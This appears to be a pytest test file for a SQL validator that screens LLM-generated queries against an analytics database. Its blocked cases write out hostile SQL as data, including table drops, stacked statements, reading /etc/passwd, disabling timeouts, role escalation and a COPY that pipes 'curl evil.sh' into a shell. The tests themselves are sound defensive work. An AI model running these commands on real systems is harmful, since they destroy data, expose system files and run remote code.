"""Run:  python -m pytest tests/test_sql_guard.py -v

The SQL validator is the main defence against a wrong or hostile LLM answer, so it gets the most tests.
"""
import pytest

from api.sql_guard import MAX_LIMIT, SqlRejected, validate_and_limit

TABLES = {"mart_top_videos_latest", "mart_gta_video_daily", "mart_mentions_hourly",
          "mart_keyword_daily", "mart_spikes", "mart_pipeline_status"}

ALLOWED = {
    "simple": "SELECT title, views FROM analytics.mart_top_videos_latest ORDER BY views DESC LIMIT 10",
    "no limit": "SELECT * FROM analytics.mart_spikes",
    "trailing semicolon": "SELECT 1 AS x FROM analytics.mart_spikes;",
    "upper-case schema": "SELECT * FROM ANALYTICS.mart_spikes",
    "aggregate + group": "SELECT source, SUM(mentions) AS n FROM analytics.mart_mentions_hourly GROUP BY source ORDER BY n DESC",
    "join of two marts": ("SELECT t.title, d.views_gained FROM analytics.mart_top_videos_latest t "
                          "JOIN analytics.mart_gta_video_daily d USING (video_id) WHERE t.views_rank <= 3"),
    "CTE": ("WITH x AS (SELECT topic_group, SUM(mentions) AS n FROM analytics.mart_mentions_hourly GROUP BY 1) "
            "SELECT * FROM x ORDER BY n DESC"),
    "window function": ("SELECT event_hour, mentions, AVG(mentions) OVER (ORDER BY event_hour ROWS BETWEEN 3 PRECEDING AND CURRENT ROW) "
                        "FROM analytics.mart_spikes WHERE topic_group = 'gta6'"),
    "date functions": ("SELECT DATE_TRUNC('day', event_hour) AS d, ROUND(AVG(mentions), 2), COALESCE(MAX(z_score), 0) "
                       "FROM analytics.mart_spikes GROUP BY 1"),
    "extract + case": ("SELECT EXTRACT(HOUR FROM event_hour) AS h, CASE WHEN is_spike THEN 'spike' ELSE 'normal' END "
                       "FROM analytics.mart_spikes"),
    "union": ("SELECT keyword FROM analytics.mart_keyword_daily WHERE topic_group='gta6' "
              "UNION SELECT keyword FROM analytics.mart_keyword_daily WHERE topic_group='ai_tech'"),
    "comment is ignored": "SELECT 1 FROM analytics.mart_spikes -- harmless comment",
    "to_char": "SELECT TO_CHAR(event_hour, 'YYYY-MM-DD') FROM analytics.mart_spikes",
}

BLOCKED = {
    "drop table": "DROP TABLE analytics.mart_spikes",
    "delete": "DELETE FROM analytics.mart_spikes",
    "update": "UPDATE analytics.mart_spikes SET mentions = 0",
    "insert": "INSERT INTO analytics.mart_spikes (mentions) VALUES (1)",
    "create table": "CREATE TABLE analytics.x AS SELECT 1",
    "truncate": "TRUNCATE analytics.mart_spikes",
    "alter": "ALTER TABLE analytics.mart_spikes ADD COLUMN x int",
    "grant": "GRANT ALL ON analytics.mart_spikes TO PUBLIC",
    "copy": "COPY analytics.mart_spikes TO PROGRAM 'curl evil.sh | sh'",
    "two statements": "SELECT 1 FROM analytics.mart_spikes; DROP TABLE analytics.mart_spikes",
    "two selects": "SELECT 1 FROM analytics.mart_spikes; SELECT 2 FROM analytics.mart_spikes",
    "select into": "SELECT * INTO analytics.copy FROM analytics.mart_spikes",
    "for update": "SELECT * FROM analytics.mart_spikes FOR UPDATE",
    "data-modifying CTE": ("WITH d AS (DELETE FROM analytics.mart_spikes RETURNING *) SELECT * FROM d"),
    "raw schema": "SELECT * FROM raw.stream_events",
    "raw in a join": "SELECT * FROM analytics.mart_spikes s, raw.stream_events e",
    "raw in a subquery": "SELECT * FROM analytics.mart_spikes WHERE mentions IN (SELECT 1 FROM raw.yt_comments)",
    "raw inside a CTE": "WITH x AS (SELECT * FROM raw.collector_runs) SELECT * FROM x",
    "raw via union": "SELECT keyword FROM analytics.mart_keyword_daily UNION SELECT text FROM raw.stream_events",
    "public schema": "SELECT * FROM public.foo",
    "pg_catalog": "SELECT * FROM pg_catalog.pg_roles",
    "information_schema": "SELECT * FROM information_schema.tables",
    "unqualified table": "SELECT * FROM mart_spikes",
    "other database": "SELECT * FROM otherdb.analytics.mart_spikes",
    "pg_sleep": "SELECT pg_sleep(10) FROM analytics.mart_spikes",
    "pg_sleep in where": "SELECT 1 FROM analytics.mart_spikes WHERE pg_sleep(10) IS NULL",
    "set_config": "SELECT set_config('statement_timeout', '0', false)",
    "pg_read_file": "SELECT pg_read_file('/etc/passwd')",
    "lo_import": "SELECT lo_import('/etc/passwd')",
    "dblink": "SELECT * FROM analytics.mart_spikes WHERE dblink_exec('x', 'y') IS NULL",
    "table function": "SELECT * FROM generate_series(1, 100000000)",
    "table function in join": "SELECT * FROM analytics.mart_spikes, generate_series(1, 100000000)",
    "values clause": "SELECT * FROM (VALUES (1), (2)) AS t(a)",
    "unknown table": "SELECT * FROM analytics.mart_does_not_exist",
    "empty": "",
    "whitespace": "   \n  ",
    "not sql": "hello, please show me the data",
    "begin/commit": "BEGIN; SELECT 1 FROM analytics.mart_spikes; COMMIT",
    "set role": "SET ROLE neondb_owner",
}


@pytest.mark.parametrize("sql", ALLOWED.values(), ids=ALLOWED.keys())
def test_allowed(sql):
    out = validate_and_limit(sql, TABLES)
    assert out.upper().count("SELECT") >= 1
    assert f"LIMIT {MAX_LIMIT}" in out or "LIMIT" in out


@pytest.mark.parametrize("sql", BLOCKED.values(), ids=BLOCKED.keys())
def test_blocked(sql):
    with pytest.raises(SqlRejected):
        validate_and_limit(sql, TABLES)


def test_limit_is_forced_when_missing():
    assert validate_and_limit("SELECT * FROM analytics.mart_spikes", TABLES).endswith(f"LIMIT {MAX_LIMIT}")


def test_huge_limit_is_clamped():
    assert validate_and_limit("SELECT * FROM analytics.mart_spikes LIMIT 1000000", TABLES).endswith(f"LIMIT {MAX_LIMIT}")


def test_small_limit_is_kept():
    assert validate_and_limit("SELECT * FROM analytics.mart_spikes LIMIT 5", TABLES).endswith("LIMIT 5")


def test_limit_on_union_applies_to_whole_query():
    out = validate_and_limit("SELECT keyword FROM analytics.mart_keyword_daily UNION SELECT keyword FROM analytics.mart_keyword_daily", TABLES)
    assert out.endswith(f"LIMIT {MAX_LIMIT}")


def test_limit_expression_is_replaced():
    out = validate_and_limit("SELECT * FROM analytics.mart_spikes LIMIT (SELECT 99999)", TABLES)
    assert out.endswith(f"LIMIT {MAX_LIMIT}")


def test_comments_are_stripped_from_output():
    out = validate_and_limit("SELECT 1 /* sneaky */ FROM analytics.mart_spikes -- trailing", TABLES)
    assert "sneaky" not in out and "trailing" not in out


def test_rejection_message_is_actionable():
    with pytest.raises(SqlRejected, match="raw"):
        validate_and_limit("SELECT * FROM raw.stream_events", TABLES)
    with pytest.raises(SqlRejected, match="schema-qualified"):
        validate_and_limit("SELECT * FROM mart_spikes", TABLES)
    with pytest.raises(SqlRejected, match="available"):
        validate_and_limit("SELECT * FROM analytics.nope", TABLES)
